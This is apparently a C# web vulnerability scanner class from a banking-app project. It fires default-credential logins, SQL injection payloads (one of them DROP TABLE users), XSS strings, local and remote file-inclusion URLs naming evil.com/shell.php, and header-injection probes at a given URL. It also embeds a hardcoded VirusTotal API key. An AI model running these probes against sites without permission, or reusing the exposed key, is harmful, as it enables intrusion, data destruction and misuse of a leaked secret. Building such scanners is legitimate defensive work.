using HtmlAgilityPack;
using MGOBankApp.BLL.Interfaces;
using MGOBankApp.Models;
using RestSharp;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace MGOBankApp.BLL.Utilities
{
    public class VulnerabilityAnalyzer : IVulnerabilityAnalyzer
    {
        private readonly HttpClient _httpClient;
        private readonly RestClient _restClient;
        private readonly string _virusTotalApiKey = "d385569c8812fd914740dd26544e1d01ca87efc433ac7c44e4dfc0ff0689cb97"; // Замените на ваш ключ
        public VulnerabilityAnalyzer(HttpClient httpClient, RestClient restClient)
        {
            _httpClient = httpClient;
            var options = new RestClientOptions("https://www.virustotal.com/api/v3/")
            {
                ThrowOnAnyError = true
            };
            _restClient = new RestClient(options) ?? throw new InvalidOperationException("Failed to initialize RestClient");
        }


        public async Task<List<string>> FindLoginPages(string baseUrl)
        {
            var loginPages = new HashSet<string>();
            try
            {
                var response = await _httpClient.GetStringAsync(baseUrl);
                var doc = new HtmlDocument();
                doc.LoadHtml(response);

                // 🏷 Find Login Links (e.g., <a href="/login">Login</a>)
                var links = doc.DocumentNode.SelectNodes("//a[contains(translate(@href, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', 'abcdefghijklmnopqrstuvwxyz'), 'login')]");
                if (links != null)
                {
                    foreach (var link in links)
                    {
                        var href = link.GetAttributeValue("href", "");
                        if (!string.IsNullOrEmpty(href))
                        {
                            var absoluteUrl = new Uri(new Uri(baseUrl), href).ToString();
                            loginPages.Add(absoluteUrl);
                        }
                    }
                }

                // 📝 Find Login Forms (e.g., <form action="/auth"> with <input type="password">)
                var forms = doc.DocumentNode.SelectNodes("//form");
                if (forms != null)
                {
                    foreach (var form in forms)
                    {
                        var passwordInput = form.SelectSingleNode(".//input[@type='password']");
                        if (passwordInput != null)
                        {
                            var action = form.GetAttributeValue("action", "");
                            if (!string.IsNullOrEmpty(action))
                            {
                                var absoluteUrl = new Uri(new Uri(baseUrl), action).ToString();
                                loginPages.Add(absoluteUrl);
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error finding login pages: {0}", ex.Message);
            }
            return loginPages.ToList();
        }





        public bool CsrfTest(string method, HtmlNode form)
        {
            var csrfToken = form.SelectSingleNode(".//input[@name='csrf_token']");
            return csrfToken == null && method == "post";
        }

        public async Task<bool> BrokenAuthenticationTest(string loginUrl)
        {
            var weakCredentials = new List<KeyValuePair<string, string>>
            {
                new("admin", "admin"),
                new("admin", "password"),
                new("root", "toor"),
                new("user", "user"),
                new("test", "test"),
                new("admin", "123456")
            };

            foreach (var creds in weakCredentials)
            {
                var loginData = new Dictionary<string, string>
                {
                    { "username", creds.Key },
                    { "password", creds.Value }
                };

                var (response, statusCode) = await SendRequest("post", loginUrl, loginData);
                if (statusCode == 200 && (response.Contains("dashboard") || response.Contains("welcome") || response.Contains("logout")))
                    return true;
            }
            return false;
        }

        // 🔄 Update to SQLi Test: Now Also Tests Login Pages
        public async Task<bool> SqlInjectionTest(Dictionary<string, string> data, string method, string absoluteAction)
        {
            var payloads = new List<string>
    {
        "' OR 1=1 --",
        "\" OR \"1\"=\"1",
        "' UNION SELECT null, version() --",
        "'; DROP TABLE users --",
        "' AND '1'='1",
        "' OR 'a'='a"
    };

            foreach (var payload in payloads)
            {
                var testData = new Dictionary<string, string>(data); // Copy original data

                // Inject payload into ALL fields (like username, password)
                foreach (var key in testData.Keys)
                    testData[key] = payload;

                var (response, statusCode) = await SendRequest(method, absoluteAction, testData);

                // Catch common signs of SQLi
                if (statusCode == 500 || response.Contains("SQL syntax") || response.Contains("database error") || response.Contains("ORA-") || response.Contains("MySQL"))
                    return true;
            }

            return false;
        }



        // 🎭 XSS Test
        public async Task<bool> XssTest(string method, string absoluteAction, Dictionary<string, string> data)
        {
            var payloads = new List<string>
                {
                    "<script>alert('xss')</script>",
                    "\"><script>alert(1)</script>",
                    "<svg onload=alert(1)>",
                    "'><img src=x onerror=alert(1)>",
                    "<iframe src=javascript:alert(1)>"
                };

            foreach (var payload in payloads)
            {
                foreach (var key in data.Keys)
                    data[key] = payload;

                var (response, _) = await SendRequest(method, absoluteAction, data);

                // Check if the payload is reflected
                if (response.Contains(payload))
                    return true;

                // Check for common XSS indicators
                if (response.Contains("alert(1)") || response.Contains("alert('xss')"))
                    return true;
            }

            return false;
        }


        public async Task<bool> SecurityMisconfigurationTest(string url)
        {
            var sensitivePaths = new List<string> { "/.git/", "/admin/", "/backup.zip" };
            foreach (var path in sensitivePaths)
            {
                var response = await _httpClient.GetAsync(url + path);
                if (response.IsSuccessStatusCode)
                    return true;
            }
            return false;
        }

        public async Task<bool> UnvalidatedRedirectTest(string url)
        {
            var testUrl = url + "?redirect=http://evil.com";
            var response = await _httpClient.GetAsync(testUrl);
            return response.Headers.Location?.ToString() == "http://evil.com";
        }

        public async Task<bool> DirectoryListingTest(string url)
        {
            var response = await _httpClient.GetStringAsync(url);
            return response.Contains("Index of /");
        }


        // 🕵️‍♂️ IDOR Test
        public async Task<bool> IdorTest(string url)
        {
            var testUrl = url.Replace("id=1", "id=2");
            var response = await _httpClient.GetStringAsync(testUrl);
            return response.Contains("User 2") || response.Contains("admin");
        }

        // 📂 RFI (Remote File Inclusion)
        public async Task<bool> RfiTest(string url)
        {
            var testUrl = url + "?file=http://evil.com/shell.php";
            var response = await _httpClient.GetStringAsync(testUrl);
            return response.Contains("shell") || response.Contains("hacked");
        }

        // 📂 LFI (Local File Inclusion)
        public async Task<bool> LfiTest(string url)
        {
            var testUrl = url + "?file=../../etc/passwd";
            var response = await _httpClient.GetStringAsync(testUrl);
            return response.Contains("root:x:0:0:") || response.Contains("bin/bash");
        }

        // 🔀 HTTP Response Splitting
        public async Task<bool> HttpResponseSplittingTest(string url)
        {
            var testUrl = url + "?header=%0D%0ASet-Cookie:%20session=evil";
            var response = await _httpClient.GetAsync(testUrl);
            return response.Headers.Contains("Set-Cookie");
        }

        // 🎣 Проверка фишинга
        public async Task<bool> PhishingTest(string url)
        {
            try
            {
                if (_restClient == null)
                    throw new InvalidOperationException("RestClient не инициализирован");

                var request = new RestRequest("urls", Method.Post);
                request.AddHeader("accept", "application/json");
                request.AddHeader("x-apikey", _virusTotalApiKey);
                request.AddParameter("url", url);

                var response = await _restClient.ExecuteAsync(request);
                if (!response.IsSuccessful)
                    return false;

                var content = response.Content ?? "";
                return content.Contains("\"malicious\":1") || content.Contains("\"phishing\":true");
            }
            catch (Exception ex)
            {
                return false;
            }
        }

        // 📜 Вспомогательная функция для отправки запросов
        public async Task<(string response, int statusCode)> SendRequest(string method, string action, Dictionary<string, string> data)
        {
            HttpResponseMessage response;
            if (method == "post")
            {
                var content = new FormUrlEncodedContent(data);
                response = await _httpClient.PostAsync(action, content);
            }
            else
            {
                var query = string.Join("&", data.Select(kvp => $"{Uri.EscapeDataString(kvp.Key)}={Uri.EscapeDataString(kvp.Value)}"));
                response = await _httpClient.GetAsync($"{action}?{query}");
            }

            return (await response.Content.ReadAsStringAsync(), (int)response.StatusCode);
        }

        public bool IsHttp(Uri baseUri) => baseUri.Scheme.Equals("http", StringComparison.OrdinalIgnoreCase);


        public int CalculateVulnerabilityCount(Vulnerability vulnerability)
        {
            int vulnCount = 0;
            if (vulnerability.SQLi) vulnCount++;
            if (vulnerability.XSS) vulnCount++;
            if (vulnerability.CSRF) vulnCount++;
            if (vulnerability.HTTPWithoutS) vulnCount++;
            if (vulnerability.IDOR) vulnCount++;
            if (vulnerability.SecurityMisconfiguration) vulnCount++;
            if (vulnerability.UnvalidatedRedirectAndForwards) vulnCount++;
            if (vulnerability.DirectoryListing) vulnCount++;
            return vulnCount;
        }
    }
}
